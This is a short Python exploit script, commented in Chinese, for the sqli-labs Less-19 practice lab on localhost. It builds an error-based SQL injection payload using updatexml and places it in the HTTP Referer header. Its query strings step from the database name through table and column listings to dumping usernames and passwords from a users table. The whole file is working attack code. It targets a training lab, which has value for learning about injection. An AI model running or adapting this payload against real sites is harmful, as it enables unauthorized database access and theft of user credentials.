import requests
# inject_type =  登录成功，通过Referer 报错注入
pre_inject_str = "aaa',"
suff_inject_str = ")#"
mid_start_pos = 1
# poc 填写 sql注入语句
# 查询当前数据库名称
poc = f"select database()"
# 查询所有数据库名称
poc = f"select group_concat(schema_name) from information_schema.schemata"
# # 查询数据库中的所有表名
table_schema='security'
poc = f"select group_concat(table_name) from information_schema.tables where table_schema='{table_schema}'"
# # # # 查询表中的所有字段
table_name='users'
poc = f"select group_concat(column_name) from information_schema.columns where table_name='{table_name}' and table_schema='{table_schema}'"
# # # # 查询表中所有的内容
ziduan='username,0x7e,password'
poc = f"select group_concat({ziduan}) from {table_name}"
exp = f"{pre_inject_str}updatexml(1,concat(0x7e,mid(({poc}),{mid_start_pos},31),0x7e),1) {suff_inject_str}"
print(exp)
parms = {'uname': 'admin','passwd':'admin','submit':'Submit'}
url = "http://localhost/sqli-labs/Less-19/"
headers = {'Referer':exp}

def get_fun():
    results = requests.post(url,data=parms,headers=headers).text
    print(results)

if __name__ == '__main__':
    get_fun()